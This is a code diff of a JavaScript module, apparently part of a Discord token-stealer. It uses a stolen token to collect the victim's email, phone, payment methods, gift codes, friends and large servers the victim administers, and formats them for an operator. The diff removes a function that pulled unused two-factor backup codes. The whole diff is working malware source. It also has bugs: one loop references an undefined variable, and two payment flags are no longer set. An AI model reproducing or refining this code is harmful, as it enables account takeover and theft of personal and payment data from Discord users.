@@ -1,14 +1,14 @@
 "use strict";
-const request = require("sync-request");
+const sync_fetch = require("sync-fetch");
 
-module.exports = class DiscordToken { 
+module.exports = class DiscordToken {
   constructor(token) {
     const user = this.getDiscordApi("https://discord.com/api/v9/users/@me", token);
-    const profile = this.getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0],"base64").toString("binary")}/profile`, token);
+    const profile = this.getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0], "base64").toString("binary")}/profile`, token);
     if (!user || user === "Invalid") {
-      this.info = {message:"Token not found"};
-      this.guilds = {message:"Token not found"};
-      this.friends = {message:"Token not found"};
+      this.info = { message: "Token not found" };
+      this.guilds = { message: "Token not found" };
+      this.friends = { message: "Token not found" };
       return;
     }
     const settings = this.getDiscordApi("https://discord.com/api/v9/users/@me/settings", token);
@@ -17,28 +17,27 @@ module.exports = class DiscordToken {
     const guilds = this.getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token);
     const applications = this.getDiscordApi("https://discord.com/api/v9/applications", token);
     const connections = this.getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token);
-    const entitlements = this.getDiscordApi( "https://discord.com/api/v8/users/@me/entitlements/gifts", token);
-    
+    const entitlements = this.getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token);
+
     let creditCard = false;
     let paypal = false;
-    paymentSources?.forEach((source) => {
-      if (source.brand && source.invalid === 0) {
-        creditCard = true;
-      }
-      if (source.email) {
-        paypal = true;
-      }
+
+    let p = "";
+    paymentSources?.forEach(s => {
+      p += s.brand && s.invalid === 0 ? emojis.user.payments[0] : "";
+      p += s.email ? emojis.user.payments[1] : "";
     });
+
     this.emojis = {
-      themes:{
+      themes: {
         dark: "Dark",
-        light: "Light",  
+        light: "Light",
       },
       status: {
         online: "<:online:1129709364316491787>",
         idle: "<:idle:1120542710424674306>",
         dnd: "<:dnd:974692691289993216>",
-        invisible: "<:offline:1137141023529762916>",  
+        invisible: "<:offline:1137141023529762916>",
       },
       user: {
         boost: [
@@ -54,7 +53,7 @@ module.exports = class DiscordToken {
         ],
         payments: [
           "<a:card:1083014677430284358> ",
-          "<:paypal:1129073151746252870> " 
+          "<:paypal:1129073151746252870> "
         ],
         i: [
           "<:staff:1090015968618623129> ",
@@ -71,19 +70,21 @@ module.exports = class DiscordToken {
         ]
       },
     }
+
     this.paymentSources = "";
     this.paymentSources = creditCard ? this.emojis.user.payments[0] : "";
     this.paymentSources += paypal ? this.emojis.user.payments[1] : "None";
+
     this.info = {
       token: token,
       ID: user.id,
       globalName: `${user.global_name}`,
-      avatarDecoration: `${user.avatar_decoration_data ? user.avatar_decoration_data: "None"}`,
+      avatarDecoration: `${user.avatar_decoration_data ? user.avatar_decoration_data : "None"}`,
       username: `${user.username}#${user.discriminator}`,
       badges: this.AllBadges(user.flags),
       nitroType: this.getNitroPremium(profile),
-      avatar: user.avatar ? this.getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`): "has no avatar",
-      banner: user.banner ? this.getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`): "has no banner",
+      avatar: user.avatar ? this.getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`) : "has no avatar",
+      banner: user.banner ? this.getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`) : "has no banner",
       totalFriend: relationships.filter((relation) => relation.type === 1).length,
       totalBlocked: relationships.filter((relation) => relation.type === 2).length,
       pending: relationships.filter((relation) => relation.type === 3).length,
@@ -98,21 +99,24 @@ module.exports = class DiscordToken {
       bio: user.bio || "has no description",
       phone: user.phone || "has no phone",
       mail: user.email,
-      billing: this.paymentSources,
+      billing: p ? p : "Not Found",
       langue: this.getLanguage(settings.locale),
       status: this.getStatusEmoji(settings.status),
-      theme: this.getTheme(settings.theme),  
+      theme: this.getTheme(settings.theme),
       Gifts: this.getGiftsCodes(token, settings),
       StrangeFriends: this.rareFriend(relationships),
     };
+
     this.guilds = {
       rares: this.getGuilds(guilds).rare
     };
+
     this.friends = {
       rares: this.rareFriend(relationships)
     }
   }
-  getGuilds(n){
+
+  getGuilds(n) {
     let guilds = n;
     let format = (l, x) => l.length ? l.map((s) => x ? `${s.owner ? "<:owner:963333541343686696>" : "<:staff:846569357353680896>"} | **${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\`` : `${s.owner ? "<:owner:963333541343686696> " : ""}**${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\``).join("\n") : "Not Found";
     return {
@@ -120,34 +124,6 @@ module.exports = class DiscordToken {
       rare: format(guilds.filter((s) => s.owner || (s.permissions & 8) === 8).filter((s) => s.approximate_member_count >= 500).map((s) => ({ id: s.id, name: s.name, owner: s.owner, member_count: s.approximate_member_count })), true),
     };
   };
-  getMfa2Codes(token, password) {
-    let result = "";
-    try {
-      const response = request(
-        "POST",
-        "https://discord.com/api/v9/users/@me/mfa/codes",
-        { headers: { "Content-Type": "application/json", authorization: token },
-          body: JSON.stringify({
-            password: password,
-            regenerate: false,
-          }),
-        },
-      );
-      const data = JSON.parse(response.getBody());
-      if (data.backup_codes) {
-        data.backup_codes.forEach((code) => {
-          if (code.consumed === null) {
-            result += `${code.code} | `;
-          }
-        });
-        return result.slice(0, -2);
-      } else {
-        return "No backup codes found";
-      }
-    } catch (error) {
-      return "Error retrieving MFA codes";
-    }
-  }
   getLanguage(locale) {
     const languages = {
       "zh-TW": "🇨🇳 Chinese-Taiwanese",
@@ -190,10 +166,7 @@ module.exports = class DiscordToken {
   }
   getGiftsCodes(token, settings) {
     const result = [];
-    const gifts = this.getDiscordApi(
-      `https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${settings.locale}`,
-      token,
-    );
+    const gifts = this.getDiscordApi(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${settings.locale}`, token);
     gifts?.forEach((gift) => {
       result.push({
         name: gift.promotion.outbound_title,
@@ -202,17 +175,8 @@ module.exports = class DiscordToken {
     });
     return result;
   }
-  getImage(url) {
-    if (!url) return false;
-    return (
-      `${url}${(
-          request("GET", url).headers["content-type"] 
-          === "image/gif" 
-          ? ".gif?size=512" 
-          : ".png?size=512"
-        )}`
-    );
-  }
+  getImage = (p) => !p ? false : `${p}.${sync_fetch(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
+
   rareFriend(relationships) {
     let result = "";
     const friendRelationships = relationships.filter(
@@ -228,13 +192,14 @@ module.exports = class DiscordToken {
     return result || "None";
   }
   getDiscordApi(url, token) {
-    const res = require("sync-fetch")(url, {
-        headers: {
-          "Content-Type": "application/json",
-          authorization: token
-        }
-    }).json();
-    return res.code == 0 ? "Invalid" : res
+    const res = sync_fetch(url, {
+      method: "GET",
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: token
+      }
+    });
+    return res.status === 200 ? res.json() : "Invalid";
   }
   AllBadges(flags) {
     let result = "";
